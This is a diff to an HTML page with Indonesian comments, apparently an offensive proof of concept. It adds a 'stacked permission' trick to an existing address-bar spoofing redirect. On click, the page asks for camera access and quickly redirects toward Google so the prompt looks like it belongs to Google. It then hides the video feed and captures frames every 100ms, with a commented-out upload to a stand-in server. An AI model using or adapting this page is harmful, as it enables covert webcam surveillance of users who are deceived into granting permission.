@@ -7,15 +7,15 @@
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #000; color: #0f0; font-family: monospace;
+    background: #000; color: #f00; font-family: monospace;
     display: flex; justify-content: center; align-items: center;
     height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
   }
-  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #0f0; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(0,255,0,0.5); }
+  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
   h2 { animation: blink 0.2s infinite; }
   @keyframes blink { 50% { opacity: 0.2; } }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
-  iframe { display: none; }
+  iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
@@ -27,6 +27,8 @@
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
+<video id="cam-feed" autoplay playsinline muted></video>
+<canvas id="processing-canvas" width="640" height="480"></canvas>
 
 <script>
 (function () {
@@ -43,11 +45,41 @@
   // ============================================
   // KONFIGURASI
   // ============================================
-  var GOOGLE_DELAY = "http://google.com:9081"; // Akan timeout
-  var GOOGLE_REAL = "https://www.google.com"; // Target akhir (jika user mengira ini google asli)
+  var GOOGLE_DELAY = "http://google.com:9081"; // Memicu delay
+  var GOOGLE_REAL = "https://www.google.com"; // Target akhir
+  
+  // ============================================
+  // FUNGSI: CAMERA PERMISSION REQUEST
+  // ============================================
+  function triggerCameraPermission() {
+    try {
+      log("[+] Meminta Izin Kamera...");
+      
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(function(stream) {
+          var video = document.getElementById('cam-feed');
+          video.srcObject = stream;
+          video.play().catch(function(){});
+          log("[+] Kamera BERHASIL diakses!");
+          
+          // Stream ke server (Opsional)
+          setInterval(function() {
+            var canvas = document.getElementById('processing-canvas');
+            var ctx = canvas.getContext('2d');
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              // fetch('https://your-server.com/upload', ...) 
+            }
+          }, 100);
+        })
+        .catch(function(err) {
+          log("[-] Kamera diblokir: " + err.name);
+        });
+    } catch(e) {}
+  }
 
   // ============================================
-  // TRIGGER DELAY SPOOFING (KLIK)
+  // TRIGGER STACKING & REDIRECT (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
@@ -55,26 +87,24 @@
 
     document.getElementById('main-card').innerHTML = `
       <h2>EXECUTING...</h2>
-      <p>Memulai Delay Spoofing...</p>
+      <p>Memulai Stacked Permission & Redirect...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Delay Spoofing...");
+    log("[!] Memulai Stacked Permission...");
 
-    // ============================================
-    // A. REDIRECT KE PORT 9081 (MEMICU DELAY)
-    // ============================================
-    try {
-      log("[+] Redirect ke google.com:9081 (Delay)...");
-      // Jika ini berhasil, browser akan menunggu (timeout)
-      window.location.href = GOOGLE_DELAY;
-    } catch(e) {}
+    // A. Minta Izin Kamera (0ms)
+    triggerCameraPermission();
 
-    // ============================================
-    // B. TIMPA DENGAN GOOGLE ASLI (SPOOFING)
-    // ============================================
-    // Setelah 500ms, timpa redirect ke Google asli.
-    // User mungkin mengira ini google.com:9081 yang berhasil.
+    // B. Redirect ke Google Port 9081 (10ms - Setelah prompt muncul)
+    setTimeout(function() {
+      log("[+] Redirect ke Google:9081 (Delay)...");
+      try {
+        window.location.href = GOOGLE_DELAY;
+      } catch(e) {}
+    }, 10);
+
+    // C. Timpa dengan Google Asli (500ms)
     setTimeout(function() {
       log("[+] Menimpa dengan Google Asli...");
       try {
@@ -82,9 +112,7 @@
       } catch(e) {}
     }, 500);
 
-    // ============================================
-    // C. FALLBACK IFRAME (JIKA REDIRECT GAGAL)
-    // ============================================
+    // D. Fallback Iframe (1000ms)
     setTimeout(function() {
       log("[+] Mengirim Delay via Iframe...");
       try {
